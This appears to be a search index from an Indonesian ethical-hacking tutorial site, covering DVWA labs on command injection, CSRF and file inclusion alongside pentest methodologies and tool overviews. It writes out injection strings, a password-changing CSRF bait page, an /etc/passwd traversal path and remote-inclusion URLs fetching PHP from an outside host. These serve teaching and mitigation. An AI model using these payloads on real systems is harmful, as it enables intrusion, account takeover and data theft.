DVWA"},"/docs/hacking/hacking_fundamentals/memahami-command-injection/":{"data":{"":"","apa-itu-command-injection#Apa itu Command Injection?":"Command Injection adalah kerentanan keamanan yang terjadi ketika suatu aplikasi menerima input dari pengguna dan mengeksekusi perintah sistem operasi tanpa melakukan validasi atau sanitasi yang memadai. Kerentanan ini memungkinkan penyerang untuk menyisipkan dan menjalankan perintah yang tidak diotorisasi pada server.\nCommand Injection berbeda dengan Insecure File Upload atau Unrestricted File Upload:\nInsecure File Upload: Penyerang mengunggah file berbahaya yang kemudian dijalankan oleh server. Command Injection: Penyerang langsung menjalankan perintah sistem operasi melalui input yang disediakan aplikasi. Contoh Situasi:\rMisalnya, pada sistem berbasis Debian, penyerang dapat menjalankan perintah-perintah seperti ls, cat, atau id melalui kerentanan ini. Jika aplikasi tidak membatasi atau memvalidasi input, perintah-perintah ini dapat dijalankan oleh server.","demo-di-dvwa-damn-vulnerable-web-application#Demo di DVWA (Damn Vulnerable Web Application)":"Langkah-langkah:\rPastikan DVWA Security Level dalam keadaan “Low”: Hal ini memastikan bahwa tidak ada mekanisme mitigasi yang diterapkan, sehingga kita bisa memahami cara kerentanan ini bekerja. Buka Menu Command Injection:\nNavigasikan ke menu “Command Injection” di DVWA. Uji Fitur dengan Input Standar:\nPada form “Ping a Device,” masukkan perintah sederhana seperti:\ngoogle.com\rHasilnya akan menampilkan output seperti menjalankan perintah ping di shell Bash.\nAnalisis Kode Sumber:\nJika Anda memeriksa kode sumber aplikasi, Anda akan menemukan logika seperti ini:\nUntuk server Windows NT, menggunakan perintah ping.\nUntuk server UNIX, menggunakan perintah ping -c 4.\nEksploitasi Kerentanan:\nDengan memanfaatkan fakta bahwa sistem ini tidak memvalidasi input, kita dapat menjalankan beberapa perintah sekaligus menggunakan operator seperti: \u0026\u0026: Menjalankan perintah berikutnya jika perintah sebelumnya berhasil. ||: Menjalankan perintah berikutnya jika perintah sebelumnya gagal. ;: Menjalankan perintah secara berurutan tanpa peduli hasil perintah sebelumnya. Contoh Input Berbahaya:\nMasukkan salah satu perintah berikut untuk menguji kerentanan:\ngoogle.com \u0026\u0026 id\rHasil: Menampilkan informasi user ID server, seperti www-data.\ngoogle.com || id\rHasil: Menjalankan perintah id jika ping google.com gagal.\ngoogle.com; id\rHasil: Menjalankan ping diikuti dengan id terlepas dari keberhasilan perintah pertama.\ngoogle.com; ls\rHasil: Menampilkan daftar file di direktori kerja server.\ngoogle.com; cat index.php\rHasil: Membaca isi file index.php jika memiliki izin akses.\nDampak:\nDengan mengeksploitasi kerentanan ini, penyerang dapat: Mengakses file sensitif. Mengeksekusi perintah berbahaya. Mengambil alih kontrol penuh server. ","langkah-mitigasi#Langkah Mitigasi":" Validasi dan Sanitasi Input:\nGunakan whitelist untuk input yang diizinkan. Escape karakter khusus seperti ;, |, \u0026\u0026, dan ||. Hindari Eksekusi Perintah Shell Secara Langsung:\nGunakan fungsi API yang tidak mengeksekusi shell secara langsung, seperti exec() dengan parameter terpisah di Python. Batasi Hak Akses:\nJalankan aplikasi dengan hak akses minimum (misalnya, pengguna non-root). Gunakan WAF (Web Application Firewall):\nTerapkan WAF untuk mendeteksi dan memblokir pola serangan yang mencurigakan. Audit dan Monitoring:\nPantau log server untuk mendeteksi aktivitas tidak biasa. Dengan memahami cara kerja Command Injection dan menerapkan langkah mitigasi yang tepat, Anda dapat melindungi aplikasi Anda dari serangan ini secara efektif.","teknik-dan-operator-dalam-command-injection#Teknik dan Operator dalam Command Injection":"Operator Umum:\r\u0026\u0026: Menjalankan perintah berikutnya jika perintah sebelumnya berhasil. ||: Menjalankan perintah berikutnya jika perintah sebelumnya gagal. ;: Menjalankan perintah secara berurutan tanpa memperhatikan hasil. |: Mengalihkan output dari perintah pertama sebagai input untuk perintah kedua (pipe). `: Menjalankan perintah di dalam backticks. $(): Substitusi perintah, menjalankan perintah di dalam kurung. "},"title":"Memahami Command Injection"},"/docs/hacking/hacking_fundamentals/memahami-csrf/":{"data":{"":"","3-kondisi-serangan-csrf#3 Kondisi Serangan CSRF":" A Relevant Action: Serangan CSRF biasanya ditargetkan pada aksi yang istimewa atau sensitif, seperti mengubah data pengguna atau melakukan transaksi. Cookie-based Session Handling: Sistem hanya memvalidasi sesi cookie, sehingga hacker dapat memanfaatkannya untuk mengirim permintaan palsu. No Unpredictable Request Parameter: Permintaan dengan parameter yang mudah ditebak oleh hacker, seperti password_new=smithy atau email=newuser@domain.com. ","alat-untuk-mendeteksi-csrf#Alat untuk Mendeteksi CSRF":" Burp Suite: Membantu menganalisis dan memanipulasi request. IBM AppScan: Alat komersial untuk mengidentifikasi berbagai kerentanan termasuk CSRF. OWASP ZAP (Zed Attack Proxy): Alat gratis yang dikembangkan oleh OWASP untuk pengujian keamanan aplikasi web. ","alur-csrf#Alur CSRF":"\nIlustrasi di atas menunjukkan bagaimana hacker mengirim link phishing yang memuat permintaan untuk mengubah informasi akun korban. Cara kerja CSRF: Hacker membuat permintaan palsu (misalnya mengubah password akun). Hacker mengirimkan permintaan ini melalui link yang terlihat sah kepada korban. Ketika korban mengklik link tersebut, browser mereka otomatis mengirimkan permintaan beserta sesi cookie aktif, tanpa disadari oleh korban. Contoh: Hacker mengirim permintaan perubahan password, sehingga korban percaya dan tanpa sengaja mengubah password sesuai keinginan hacker. ","apa-itu-csrf#Apa itu CSRF?":"Cross Site Request Forgery (CSRF) adalah kerentanan yang memungkinkan hacker untuk membujuk target melakukan tindakan yang tidak diinginkan, sering kali dilakukan melalui metode phishing. CSRF mengeksploitasi kepercayaan yang diberikan oleh sebuah aplikasi kepada browser pengguna.","contoh-praktis#Contoh Praktis":"Misalkan sebuah aplikasi memungkinkan pengguna mengubah alamat email mereka. Permintaan HTTP-nya seperti ini:\nPOST /email/change HTTP/1.1 Host: vulnerable-website.com Content-Type: application/x-www-form-urlencoded Content-Length: 30 Cookie: session=yvthwsztyeQkAPzeQ5gHgTv1yxHfsAfE email=wiener@normal-user.com\rPermintaan di atas memenuhi 3 kondisi serangan CSRF. Hacker dapat membuat halaman web dengan kode HTML berikut:\n\u003cimg src=\"http://vulnerable-website.com/email/change?email=attacker@malicious.com\" style=\"display:none;\" /\u003e\rJika korban membuka halaman ini saat sedang login, browser mereka akan secara otomatis menyertakan cookie sesi aktif dalam permintaan, dan alamat email mereka akan diubah tanpa izin.","dampak#Dampak":"Dampak dari CSRF sangat signifikan, terutama di Indonesia. Jika korban adalah pengguna biasa, kerugian yang dialami dapat berupa kerugian finansial atau kebocoran data pribadi. Namun, jika korban adalah seorang admin perusahaan, serangan ini dapat membahayakan seluruh perusahaan, termasuk data sensitif dan sistem operasional.","demo-di-dvwa#Demo di DVWA":" Setup Awal:\nBuka DVWA di dua jendela browser: satu di mode biasa dan satu di mode private. Login sebagai admin di jendela private. Login sebagai smithy (akun hacker) di jendela biasa. Tujuan:\nMengubah password admin menggunakan akun smithy. Langkah-Langkah:\nLogin sebagai smithy dan buka menu “CSRF”. Masukkan username dan password untuk smithy, lalu klik “Change” untuk melihat bahwa password dapat diubah menggunakan parameter GET. Membuat Exploit:\nBuat file HTML dengan konten berikut: index.html\u003ch1\u003eYou won 1000 bitcoins!\u003c/h1\u003e \u003ca href=\"http://localhost:4280/vulnerabilities/csrf/?password_new=smithy\u0026password_conf=smithy\u0026change=Change\" \u003eClick here to claim your reward!\u003c/a \u003e\rMenjalankan Server Lokal:\nSimpan file HTML tersebut dan jalankan server lokal: python3 -m http.server 8000\rPeriksa alamat IP lokal dengan ifconfig atau ipconfig. Serangan:\nBuka file HTML di browser admin (korban) menggunakan IP lokal, misalnya: http://192.168.8.120:8000/index.html. Klik link di halaman tersebut. Password admin akan otomatis berubah menjadi “smithy”. Validasi:\nLogin kembali sebagai admin menggunakan password baru (“smithy”) di browser hacker. Admin tidak dapat login dengan password lama. Pencegahan:\nGunakan CSRF token untuk memvalidasi setiap permintaan. ","pencegahan-csrf#Pencegahan CSRF":" Validasi Request: Memastikan setiap permintaan yang dikirim berasal dari pengguna yang sah. CSRF Token: Menyisipkan token unik di setiap permintaan. Token ini harus divalidasi oleh server untuk memverifikasi permintaan. Referer Header: Memastikan bahwa permintaan berasal dari halaman yang sah. Sesi yang Aman: Gunakan sesi cookie dengan atribut SameSite untuk membatasi akses lintas situs. Batasi HTTP Methods: Gunakan metode POST untuk permintaan yang sensitif. "},"title":"Memahami CSRF"},"/docs/hacking/hacking_fundamentals/memahami-file-inclusion/":{"data":{"":"","apa-itu-file-inclusion#Apa itu File Inclusion?":"File Inclusion adalah kerentanan yang terjadi ketika aplikasi web tidak memvalidasi input dengan benar yang digunakan untuk mengakses file di server. Kerentanan ini memungkinkan hacker mengakses file yang seharusnya tidak terdaftar pada aplikasi.\nKategori File Inclusion\rLocal File Inclusion (LFI)\nHacker dapat membaca file yang tidak diinginkan dengan cara menyisipkan perintah inklusi file lokal pada input aplikasi web. Terjadi pada aplikasi yang mengizinkan user mengunggah file tanpa validasi upload yang memadai. Contoh: hacker menyisipkan path lokal seperti ../../etc/passwd untuk membaca file konfigurasi sensitif. Remote File Inclusion (RFI)\nHacker dapat menyisipkan file yang dihosting di luar sistem untuk diakses oleh aplikasi web. Terjadi ketika aplikasi menerima input tanpa validasi yang memadai, memungkinkan file remote diakses dan dijalankan di server. Contoh: hacker menyisipkan URL eksternal seperti http://malicious.com/backdoor.php. Dampak\rMembaca file sensitif seperti passwd pada sistem operasi. Menjalankan file berbahaya yang diunggah oleh hacker. Memberikan akses tak terbatas ke sistem file server. Pencegahan\rLakukan sanitasi dan validasi data input dengan ketat. Hindari penggunaan fungsi yang rentan seperti include, require, include_once, dan require_once dengan input dinamis. Gunakan whitelist file yang diizinkan untuk diakses. Konfigurasikan server untuk membatasi akses file dan direktori tertentu. ","demo-file-inclusion-di-dvwa#Demo File Inclusion di DVWA":"Persiapan\rPastikan level keamanan DVWA disetel ke Low. Pergi ke menu File Inclusion. Eksperimen Local File Inclusion (LFI)\rDVWA memiliki beberapa file seperti file1.php, file2.php, dan file3.php:\nfile1.php: Berisi Username dan IP. file2.php: Berisi catatan dari aplikasi. file3.php: Informasi tentang sistem (localhost). Akses file file1.php melalui URL dan coba eksplorasi direktori root:\nlocalhost:4280/vulnerabilities/fi/?page=.../../../../../etc/passwd\rIsi file /etc/passwd akan ditampilkan, menunjukkan bahwa server rentan terhadap LFI.\nEksperimen Remote File Inclusion (RFI)\rGunakan URL berikut untuk mencoba menyisipkan file dari sumber eksternal:\nlocalhost:4280/vulnerabilities/fi/?page=https://google.com\rUntuk simulasi RFI, buat file PHP berisi kode berikut, simpan sebagai rfi.php:\n\u003c?php system(\"ls\"); ?\u003e Jalankan server HTTP lokal untuk menghosting file rfi.php. Misalnya, jika IP lokal adalah 192.168.8.120:\npython3 -m http.server 8000\rGunakan URL berikut untuk menyisipkan file remote:\nlocalhost:4280/vulnerabilities/fi/?page=http://192.168.8.120:8000/rfi.php\rServer akan menjalankan perintah ls dan menampilkan hasilnya.\nCatatan Tambahan\rPastikan DVWA berjalan di lingkungan yang aman (sandbox) saat melakukan eksperimen ini. Jangan gunakan teknik ini di sistem produksi atau tanpa izin. ","kesimpulan#Kesimpulan":"Dengan memahami mekanisme LFI dan RFI, kita dapat mengenali potensi risiko keamanan yang dihadapi aplikasi web dan mengambil langkah-langkah mitigasi yang tepat untuk mencegah eksploitasi serupa."},"title":"Memahami File Inclusion"},"/docs/hacking/hacking_fundamentals/metodologi-pentesting/":{"data":{"":"","standar-dan-metodologi-pengujian-penetrasi#Standar dan Metodologi Pengujian Penetrasi":"Berbagai metodologi pengujian penetrasi telah ada selama beberapa waktu dan terus diperbarui seiring munculnya ancaman baru. Berikut adalah beberapa metodologi dan standar pengujian penetrasi yang umum:\n1. MITRE ATT\u0026CK\rMITRE ATT\u0026CK adalah kerangka kerja yang sangat berguna untuk mempelajari taktik, teknik, dan prosedur (TTP) dari seorang penyerang. Kerangka ini banyak digunakan oleh profesional keamanan ofensif (penguji penetrasi, red teamer, bug hunter, dll.) serta tim respon insiden dan pencari ancaman.\nMITRE ATT\u0026CK terdiri dari matriks yang mencakup taktik, teknik, dan subteknik. Matriks ini, termasuk Enterprise ATT\u0026CK Matrix, Network, Cloud, ICS, dan Mobile, menyajikan taktik dan teknik yang digunakan oleh penyerang dalam persiapan serangan, seperti pengumpulan informasi (open-source intelligence [OSINT], identifikasi kelemahan teknis dan manusia), serta berbagai teknik eksploitasi dan pasca-eksploitasi.\n2. OWASP WSTG\rOWASP WSTG adalah panduan komprehensif yang berfokus pada pengujian keamanan aplikasi web. Panduan ini merupakan hasil dari banyak tahun kerja anggota OWASP. OWASP WSTG mencakup fase-fase tingkat tinggi dalam pengujian keamanan aplikasi web dan menjelaskan metode pengujian secara mendetail.\nPanduan ini mencakup vektor serangan untuk menguji serangan seperti cross-site scripting (XSS), XML external entity (XXE), cross-site request forgery (CSRF), dan SQL injection, serta cara untuk mencegah dan mengurangi serangan-serangan ini. Panduan ini adalah yang paling rinci dan lengkap dalam hal pengujian keamanan aplikasi web.\nAnda dapat menemukan OWASP WSTG dan informasi proyek terkait di https://owasp.org/www-project-web-security-testing-guide/.\n3. NIST SP 800-115\rNIST SP 800-115 adalah dokumen yang dikeluarkan oleh National Institute of Standards and Technology (NIST), yang merupakan bagian dari Departemen Perdagangan AS. Dokumen ini memberikan panduan kepada organisasi tentang cara merencanakan dan melaksanakan pengujian keamanan informasi.\nNIST SP 800-115 menggantikan dokumen standar sebelumnya, SP 800-42, dan dianggap sebagai standar industri untuk panduan pengujian penetrasi. Dokumen ini sering disebut dalam berbagai standar industri dan dokumen lainnya. Anda dapat mengakses NIST SP 800-115 di https://csrc.nist.gov/publications/detail/sp/800-115/final.\n4. OSSTMM (Open Source Security Testing Methodology Manual)\rOSSTMM adalah metodologi pengujian keamanan yang dikembangkan oleh Pete Herzog dan didistribusikan oleh Institute for Security and Open Methodologies (ISECOM). OSSTMM adalah dokumen yang memberikan panduan untuk pengujian keamanan yang dapat diulang dan konsisten. Versi saat ini adalah versi 3, sementara versi 4 masih dalam status draft.\nOSSTMM memiliki beberapa bagian penting, di antaranya:\nOperational Security Metrics Trust Analysis Work Flow Human Security Testing Physical Security Testing Wireless Security Testing Telecommunications Security Testing Data Networks Security Testing Compliance Regulations Pelaporan dengan Security Test Audit Report (STAR) Informasi lebih lanjut dapat ditemukan di https://www.isecom.org.\n5. PTES (Penetration Testing Execution Standard)\rPTES adalah standar eksekusi pengujian penetrasi yang menyediakan informasi mengenai jenis serangan dan metode, serta alat terbaru yang dapat digunakan untuk melakukan metode pengujian yang telah dijelaskan. PTES mencakup tujuh fase yang berbeda:\nPre-engagement interactions (Interaksi sebelum pengujian) Intelligence gathering (Pengumpulan intelijen) Threat modeling (Pemodelan ancaman) Vulnerability analysis (Analisis kerentanan) Exploitation (Eksploitasi) Post-exploitation (Pasca-eksploitasi) Reporting (Pelaporan) Informasi lebih lanjut dapat ditemukan di http://www.pentest-standard.org.\n6. ISSAF (Information Systems Security Assessment Framework)\rISSAF adalah metodologi pengujian penetrasi yang serupa dengan metodologi lainnya, namun mencakup beberapa fase tambahan. ISSAF mencakup fase-fase berikut:\nInformation gathering (Pengumpulan informasi) Network mapping (Pemetaan jaringan) Vulnerability identification (Identifikasi kerentanan) Penetration (Penetrasi) Gaining access and privilege escalation (Memperoleh akses dan peningkatan hak akses) Enumerating further (Enumerasi lebih lanjut) Compromising remote users/sites (Kompromi pengguna/situs jarak jauh) Maintaining access (Mempertahankan akses) Covering the tracks (Menghilangkan jejak) Metodologi ini menawarkan pendekatan yang lebih luas dalam pengujian keamanan sistem."},"title":"Metodologi Penetesting"},"/docs/hacking/hacking_fundamentals/peran_dan_tanggung_jawab_ethical_hacker/":{"data":{"":" Definisi: Ethical hacker atau white hat hacker adalah profesional keamanan siber yang secara etis mengidentifikasi dan mengeksploitasi kerentanan dalam sistem untuk meningkatkan keamanan dan mencegah serangan dari pihak yang tidak bertanggung jawab. Peran Utama: Penetration Testing: Menguji kelemahan sistem melalui simulasi serangan. Vulnerability Assessment: Mengevaluasi dan mencari kerentanan yang ada. Risk Assessment: Menilai risiko yang mungkin terjadi dari kerentanan. Security Awareness: Meningkatkan kesadaran keamanan di dalam organisasi. Incident Response: Merespons dan memulihkan dari insiden keamanan. Policy Development: Mengembangkan kebijakan keamanan yang sesuai. Tanggung Jawab: Bertindak Etis sesuai dengan kode etik dan hukum. Mendapatkan Izin dari pemilik sistem sebelum melakukan pengujian. Melaporkan Temuan secara detail kepada pihak berwenang. Menjaga Kerahasiaan informasi yang diperoleh selama pengujian. Memberikan Solusi untuk memperbaiki kerentanan. Tidak Menyalahgunakan Akses yang diperoleh selama pengujian. Keterampilan yang Dibutuhkan: Pemahaman mendalam tentang sistem operasi (Windows, Linux, Unix). Pengetahuan jaringan (TCP/IP, firewall). Penguasaan bahasa pemrograman (Python, Perl, C). Kemampuan dalam penggunaan alat seperti Nmap, Metasploit. Keterampilan komunikasi dan pemecahan masalah. Siklus Kerja Ethical Hacker: Planning: Menentukan target dan ruang lingkup pengujian. Discovery: Mengumpulkan informasi awal. Scanning: Memindai target untuk menemukan kerentanan. Exploitation: Mengeksploitasi kelemahan yang ditemukan. Gaining Access: Memperoleh dan meningkatkan hak akses. Maintaining Access: Mempertahankan akses untuk jangka waktu tertentu. Reporting: Menyusun laporan temuan. Contoh Tugas Nyata: Menguji keamanan aplikasi web, jaringan, sistem operasi, dan sistem kontrol industri. Kesimpulan: Ethical hacker membantu melindungi aset digital organisasi melalui pendekatan etis dan keterampilan yang mumpuni dalam mendeteksi serta mengamankan potensi kerentanan. "},"title":"Peran dan Tanggung Jawab Ethical Hacker"},"/docs/hacking/hacking_fundamentals/perangkat_tool_dan_lingkungan_kerja_vm-kali-linux/":{"data":{"":"","#":"1. Hardware\rKomputer: Spesifikasi: Prosesor quad-core atau lebih tinggi, minimal 8GB RAM, dan SSD untuk performa optimal. Sistem Operasi: Kebanyakan ethical hacker menggunakan distribusi Linux seperti Kali Linux, Parrot OS, atau BlackArch Linux. Jaringan: Koneksi Internet: Stabil untuk mengakses sumber daya online seperti database eksploitasi, forum diskusi, dan layanan cloud. 2. Software\rDistribusi Linux Khusus Hacking: Kali Linux: Distribusi paling populer, dilengkapi ratusan tool untuk pengujian penetrasi. Parrot OS: Fokus pada keamanan dan privasi. BlackArch Linux: Distribusi yang sangat dapat disesuaikan dengan banyak pilihan tool. Virtual Machine (VM): VirtualBox, VMware: Digunakan untuk menciptakan lingkungan virtual yang terisolasi agar bisa menguji eksploitasi tanpa merusak sistem utama. Manfaat: Pengujian eksploitasi: Menjalankan sistem operasi yang rentan untuk uji eksploitasi. Isolasi lingkungan: Menghindari kontaminasi sistem utama. Pembuatan snapshot: Memungkinkan pengembalian sistem ke kondisi sebelumnya dengan mudah. Tool Ethical Hacking: Nmap: Untuk pemindaian port dan deteksi layanan. Metasploit: Kerangka kerja populer untuk mengeksploitasi kerentanan. Burp Suite: Proxy web untuk hacking aplikasi web. Wireshark: Menganalisis lalu lintas jaringan. Aircrack-ng: Untuk cracking Wi-Fi. John the Ripper: Untuk cracking password. Hydra: Untuk serangan brute force. SQLmap: Untuk injeksi SQL. 3. Work Environment\rVirtual Lab: Platform: Hack The Box, TryHackMe, Vulnhub menyediakan lingkungan virtual untuk praktik ethical hacking. Manfaat: Pembelajaran langsung: Tantangan realistis untuk mengasah keterampilan. Eksplorasi kerentanan: Berbagai mesin virtual dengan kerentanan berbeda. Physical Lab: Membangun lab sendiri: Membuat lab fisik dengan beberapa komputer yang terhubung untuk mensimulasikan jaringan yang kompleks. Manfaat: Pengalaman lebih realistis: Lingkungan yang lebih mirip dunia nyata. Eksperimen bebas: Melakukan eksperimen yang lebih kompleks. 4. Contoh Praktik\rSkenario: Ingin menguji kerentanan aplikasi web. Langkah: Buat VM: Buat VM dengan sistem operasi yang sama dengan aplikasi target. Install aplikasi web: Pasang aplikasi pada VM. Jalankan Burp Suite: Konfigurasikan sebagai proxy untuk mencegat lalu lintas antara browser dan aplikasi. Temukan kerentanan: Gunakan Burp Suite untuk mendeteksi kerentanan seperti SQL injection, XSS, atau CSRF. Eksploitasi: Jika ditemukan kerentanan, gunakan Metasploit atau tool lainnya untuk mengeksploitasinya. Kesimpulan\rDengan perangkat keras, perangkat lunak, dan lingkungan kerja yang tepat, Anda dapat memulai perjalanan sebagai seorang ethical hacker. Ingatlah bahwa ethical hacking bertujuan untuk pembelajaran dan perbaikan, bukan penghancuran. Gunakan pengetahuan dan tool Anda dengan bijak dan bertanggung jawab."},"title":"Perangkat Tool dan Lingkungan Kerja (VM, Kali Linux)"},"/docs/hacking/hacking_fundamentals/sejarah_internet_indonesia/":{"data":{"":"Sejarah internet di Indonesia mencerminkan perjuangan panjang yang melibatkan antusiasme komunitas teknologi informasi dan pendidikan. Kehadiran internet di Indonesia sangat erat kaitannya dengan pengenalan open source, pendidikan teknologi, serta kolaborasi komunitas yang berperan dalam mengembangkan infrastruktur jaringan di tanah air.\nPengembangan Internet di Indonesia\nPerjuangan untuk membawa dan mengembangkan internet di Indonesia dimulai sejak era 1990-an dengan peran sentral berbagai individu yang gemar dan terampil di bidang teknologi informasi. Ini mencakup pengembangan komunitas, pendidikan, dan pengenalan internet serta jaringan komputer melalui kegiatan seperti pelatihan, pengenalan teknologi berbasis open source, dan proyek komunitas lainnya. Proyek penelitian “Social Construction of Technology Research Group” (SCoT) oleh Dr. Joshua Barker dan Dr. Merlyna Lim turut berperan dalam mendokumentasikan perkembangan internet di Indonesia. Mereka mendokumentasikan hasil penelitian yang dipublikasikan secara daring. Perkembangan Melalui Wikibook dan SpeedyWiki\nWikibook Sejarah Internet Indonesia awalnya dirancang sebagai sarana untuk mendokumentasikan berbagai kejadian penting dalam sejarah internet Indonesia. Proyek ini diawali di situs Wikibooks, tetapi kemudian dipindahkan ke platform lain karena alasan ketidaksesuaian dengan kebijakan Wikibooks. Pada tahun 2007, pengembangan dokumentasi sejarah internet juga dilakukan melalui SpeedyWiki, sebuah wiki komunitas yang dimulai oleh Speedy dari Telkom Multimedia. Artikel pertama mengenai sejarah internet di SpeedyWiki berjudul “Sejarah Internet Indonesia: Pra-Sejarah Internet 1970-1993” yang ditulis oleh Onno Purbo, seorang tokoh penting dalam pengembangan teknologi informasi di Indonesia. SpeedyWiki menjadi media untuk menyebarluaskan informasi dan pengetahuan mengenai sejarah internet di Indonesia. Kontribusi bagi Bangsa\nDokumentasi sejarah internet melalui inisiatif seperti Wikibook dan SpeedyWiki memiliki tujuan untuk menginspirasi masyarakat Indonesia dalam memahami perjalanan teknologi internet di tanah air. Diharapkan inisiatif ini akan terus berkembang dan memberikan kontribusi yang langgeng bagi kemajuan teknologi informasi di Indonesia. Perjuangan pengembangan internet di Indonesia menunjukkan semangat kolaborasi dan pentingnya peran komunitas dalam membangun fondasi internet yang bermanfaat bagi masyarakat luas."},"title":"Sejarah Internet Indonesia"}}